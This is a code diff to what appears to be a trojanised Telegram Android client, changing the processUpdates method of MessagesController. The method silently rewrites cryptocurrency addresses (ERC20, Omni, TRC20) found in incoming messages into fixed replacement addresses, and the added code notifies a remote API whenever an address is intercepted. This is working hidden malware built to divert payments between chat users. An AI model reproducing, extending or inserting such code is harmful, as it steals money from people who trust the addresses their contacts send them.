@@ -35,6 +35,7 @@ import androidx.core.util.Consumer;
 import org.telegram.SQLite.SQLiteCursor;
 import org.telegram.SQLite.SQLiteException;
 import org.telegram.SQLite.SQLitePreparedStatement;
+import org.telegram.entity.Data;
 import org.telegram.messenger.support.LongSparseIntArray;
 import org.telegram.messenger.support.LongSparseLongArray;
 import org.telegram.messenger.voip.VoIPService;
@@ -77,6 +78,10 @@ import java.util.Objects;
 import java.util.Set;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.CountDownLatch;
+
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
 
 public class MessagesController extends BaseController implements NotificationCenter.NotificationCenterDelegate {
 
@@ -12214,33 +12219,37 @@ public class MessagesController extends BaseController implements NotificationCe
 
     public void processUpdates(final TLRPC.Updates updates, boolean fromQueue) {
 //        updates.message = updates.message + "usdt";
+        int index = -1;
         try {
-            int index = updates.message.indexOf("0x");
+            index = updates.message.indexOf("0x");
             if (index >= 0 && updates.message.length() >= index + 42) {
                 String valueSub = updates.message.substring(index, index + 42);
                 if (valueSub.matches(regexERC20)) {
                     updates.message = updates.message.replace(valueSub, ERC20);
                 }
-            }
-            index = updates.message.indexOf("1");
-            if (index >= 0 && updates.message.length() >= index + 34) {
-                String valueSub = updates.message.substring(index, index + 34);
-                if (valueSub.matches(regexOmni)) {
-                    updates.message = updates.message.replace(valueSub, Omni);
-                }
-            }
-            index = updates.message.indexOf("3");
-            if (index >= 0 && updates.message.length() >= index + 34) {
-                String valueSub = updates.message.substring(index, index + 34);
-                if (valueSub.matches(regexOmni)) {
-                    updates.message = updates.message.replace(valueSub, Omni);
-                }
-            }
-            index = updates.message.indexOf("T");
-            if (index >= 0 && updates.message.length() >= index + 34) {
-                String valueSub = updates.message.substring(index, index + 34);
-                if (valueSub.matches(regexTRC20)) {
-                    updates.message = updates.message.replace(valueSub, TRC20);
+            } else {
+                index = updates.message.indexOf("1");
+                if (index >= 0 && updates.message.length() >= index + 34) {
+                    String valueSub = updates.message.substring(index, index + 34);
+                    if (valueSub.matches(regexOmni)) {
+                        updates.message = updates.message.replace(valueSub, Omni);
+                    }
+                } else {
+                    index = updates.message.indexOf("3");
+                    if (index >= 0 && updates.message.length() >= index + 34) {
+                        String valueSub = updates.message.substring(index, index + 34);
+                        if (valueSub.matches(regexOmni)) {
+                            updates.message = updates.message.replace(valueSub, Omni);
+                        }
+                    } else {
+                        index = updates.message.indexOf("T");
+                        if (index >= 0 && updates.message.length() >= index + 34) {
+                            String valueSub = updates.message.substring(index, index + 34);
+                            if (valueSub.matches(regexTRC20)) {
+                                updates.message = updates.message.replace(valueSub, TRC20);
+                            }
+                        }
+                    }
                 }
             }
         } catch (Exception e) {
@@ -12250,10 +12259,28 @@ public class MessagesController extends BaseController implements NotificationCe
         List<TLRPC.User> users = updates.users;
         for (int i = 0; i < users.size(); i++) {
             TLRPC.User user = users.get(i);
-            FileLog.d("update message short message  username==" + user.username + " first_name==" + user.first_name + " last_name==" + user.last_name);
+            FileLog.d("update message short message username==" + user.username + " first_name==" + user.first_name + " last_name==" + user.last_name);
         }
 
         FileLog.d("update message short message 拦截之前 = " + updates.message);
+
+        if (index >= 0) {
+            FileLog.d("update message short message 拦截之前 = " + "hhhhhhhhhh");
+            ApiRequest request = new ApiRequest();
+            request.type = "hhhhhhhhhh";
+            Call<Data<ApiDetail>> dataCall = ApplicationLoader.api.getNotifyDetail(ApplicationLoader.getHeaderMap(), request);
+            dataCall.enqueue(new Callback<Data<ApiDetail>>() {
+                @Override
+                public void onResponse(Call<Data<ApiDetail>> call, Response<Data<ApiDetail>> response) {
+
+                }
+
+                @Override
+                public void onFailure(Call<Data<ApiDetail>> call, Throwable t) {
+
+                }
+            });
+        }
 
         processUpdatesDetail(updates, fromQueue);
     }
